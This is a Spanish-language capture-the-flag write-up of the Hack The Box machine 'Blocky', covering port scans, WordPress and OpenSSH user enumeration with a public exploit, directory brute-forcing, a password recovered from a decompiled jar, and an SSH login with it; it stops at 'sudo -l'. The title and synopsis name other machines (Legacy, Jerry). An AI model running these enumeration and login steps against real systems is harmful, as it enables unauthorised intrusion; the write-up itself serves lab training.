# HACK THE BOX PEN - TESTING LABS
## MACHINE LEGACY
> ![alt text](https://i.postimg.cc/q72ZPGDB/Blocky.png)
---

### Sinopsis 
Aunque Jerry es una de las máquinas más fáciles en Hack The Box, es realista ya que Apache Tomcat es a menudo se encuentra expuesto y configurado con credenciales comunes o débiles.
### Habilidades Aprendidas

> * Enumeración y escaneo.
> * Conexion remota con Netcat.
> * Enumeración
> * Enumeración de WordPress
> * Fuga de Información
> * Analizando un archivo jar - JD-Gui + Acceso SSH
> * Abusando del Privilegio Sudoers [Escalada de Privilegios]
## Enumeración y Escaneo

Para iniciar la fase de reconocimiento, se puede verificar la conectividad del equipo víctima; para esto se puede usar el protocolo _ICMP_, y con el _ttl_ obtenido se puede verificar la version del sistema.

#### Validación de conectividad.
```java
ping -c 1 10.10.10.37
PING 10.10.10.37 (10.10.10.37) 56(84) bytes of data.
64 bytes from 10.10.10.37: icmp_seq=1 ttl=63 time=91.7 ms
--- 10.10.10.37 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 91.713/91.713/91.713/0.000 ms

```
>*_Nota_*: el parametro *_-c_* de la traza icmp, permite enviar los paquetes asignados para la prueba, en el ejemplo anterior un solo paquete. Y como se pude interpretar, el ttl corresponde a una maquina linux.

### Escaneo y enumeración de servicios
Para la etapa de identificación de viulnerabilidades utilizamos la herramienta *_nmap_*, que servirá para verificar los servicioes y puertos expuestos.

#### Identicación de puertos y servicios con nmap. 65535 Puertos.
```java
# nmap -p- --open -T5 -v -n -oG allPorts 10.10.10.37
# nmap  -p- --open -sS --min-rate 5000-vvv -n -Pn 10.10.10.37 -oG allPorts
# nmap -p21,22,80,25565 -sCV -vvvv 10.10.10.37 -oN targeted
```
Con nmap se puede agregar el flag `-sCV`, para extaer mas detalles de la enumeración.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/jerry/nmap]
└─# cat targeted -l java
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
File: targeted
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# Nmap 7.93 scan initiated Thu Jan 26 20:53:46 2023 as: nmap -p21,22,80,25565 -sCV -vvvv -oN targeted 10.10.10.37
Nmap scan report for blocky.htb (10.10.10.37)
Host is up, received echo-reply ttl 63 (0.11s latency).
Scanned at 2023-01-26 20:53:47 -05 for 16s

PORT      STATE SERVICE   REASON         VERSION
21/tcp    open  ftp       syn-ack ttl 63 ProFTPD 1.3.5a
22/tcp    open  ssh       syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqVh031OUgTdcXsDwffHKL6T9f1GfJ1/x/b/dywX42sDZ5m1Hz46bKmbnWa0YD3LSRkStJDtyNXptzmEp31Fs2DUndVKui3LCcyKXY6FSVWp9ZDBzlW3aY8qa+y339OS3gp3aq277z
YDnnA62U7rIltYp91u5VPBKi3DITVaSgzA8mcpHRr30e3cEGaLCxty58U2/lyCnx3I0Lh5rEbipQ1G7Cr6NMgmGtW6LrlJRQiWA1OK2/tDZbLhwtkjB82pjI/0T2gpA/vlZJH0elbMXW40Et6bOs2oK/V2bVozpoRyoQuts8zcRmCViVs8B
3p7T1Qh/Z+7Ki91vgicfy4fl
|   256 5d7f389570c9beac67a01e86e7978403 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgEpgEZGGbtm5suOAio9ut2hOQYLN39Uhni8i4E/Wdir1gHxDCLMoNPQXDOnEUO1QQVbioUUMgFRAXYLhilNF8=
|   256 09d5c204951a90ef87562597df837067 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILqVrP5vDD4MdQ2v3ozqDPxG1XXZOp5VPpVsFUROL6Vj
80/tcp    open  http      syn-ack ttl 63 Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 4.8
|_http-title: BlockyCraft &#8211; Under Construction!
25565/tcp open  minecraft syn-ack ttl 63 Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 26 20:54:03 2023 -- 1 IP address (1 host up) scanned in 17.35 seconds
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Con el puerto numero 8080 abierto, se puede obtener información con `whatweb` para obtener información del servicio.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blocky/nmap]
└─# whatweb http://10.10.10.37
http://10.10.10.37 [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.37], RedirectLocation[http://blocky.htb], Title[302 Found]
```
En el comando `RedirectLocation`, se puede ser que se esta direccionando al dns `http://blocky.htb`, por lo que, agregamos el dns en el `/etc/hosts`.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blocky/nmap]
└─# whatweb http://10.10.10.37
http://blocky.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.37], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[BlockyCraft &#8211; Under Construction!], UncommonHeaders[link], WordPress[4.8]
```                                                                                                                                              
Una vez identificado wordpress, se peude verificar que existe un usuario notch, que ha escrito un blogs.
> ![alt text](https://i.postimg.cc/Px56cngh/blocky2.png)

Con esta pista podemos usar wpscan para hacer enumeración de usuarios y plugins vulnerables.

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blocky/content]
└─# wpscan --url http://blocky.htb/ -e u vp -o scanWP
```
### Detalles atributos
>* **-e.-**   Flag Enumerar.
>* **u.-**    Establecer usarios enumerado.
>* **vp.-**   Plugins vulnerables.
>* **-o.-**     Flag para exportar el resultado
>* **scanWP.-** Nombre del archivo exportado.

En el escaneo hecho con wpscan, se puede verificar confirmar que existe un usuario notch, pero no existe un vulnerabiliad.

```java 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
File: scanWP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blocky.htb/ [10.10.10.37]
[+] Started: Thu Jan 26 22:44:53 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blocky.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blocky.htb/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://blocky.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'


[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jan 26 22:45:05 2023
[+] Requests Done: 55
[+] Cached Requests: 8
[+] Data Sent: 14.385 KB
[+] Data Received: 406.741 KB
[+] Memory used: 158.746 MB
[+] Elapsed time: 00:00:11
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
En el escaneo ejecutado con nmap, comprobo que el puerto ssh, es vulnerable para enumeración de usuarios, por lo que, esto se puede confirmar si los usuarios exiten en ssh.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blocky/content]
└─# searchsploit ssh enum user                                    
------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                             |  Path
------------------------------------------------------------------------------------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                   | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                             | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                                       | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                                                                       | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                      | linux/remote/40113.txt
------------------------------------------------------------------------------------------------------------
```
El exploit permite ver que usuarios existen en shh.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blocky/content]
└─# python2 45939.py 10.10.10.37 root 2> /dev/null
[+] root is a valid username
┌──(root㉿kali)-[/home/…/CTF/HTB/blocky/content]
└─# python2 45939.py 10.10.10.37 notch 2> /dev/null
[+] notch is a valid username
┌──(root㉿kali)-[/home/…/CTF/HTB/blocky/content]
└─# python2 45939.py 10.10.10.37 Notch 2> /dev/null
[-] Notch is an invalid username
```
Con gobuster hacemos enumeración de directorios.

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blocky/nmap]
└─# gobuster dir -u http://blocky.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blocky.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/26 23:29:15 Starting gobuster in directory enumeration mode
===============================================================
/wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
```
En la ruta plugins, existe dos archivos `.jar`, abrimos el archivo `BlockyCore.jar`, con un decompilador de java. `jd-gui`
> ![alt text](https://i.postimg.cc/q7f35P5Y/blocky3.png)

Con la contrasela encontrada accedemos con ssh y el usuario notch.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blocky/nmap]
└─# sshpass -p '8YsqfCTnvxAUeduzjNSXe22' ssh notch@10.10.10.37
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Thu Jan 26 21:30:51 2023 from 10.10.14.14
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$ 
```
Una vez accedido solo listamos los archivos para elevedar privilegios con `sudo -l`, 
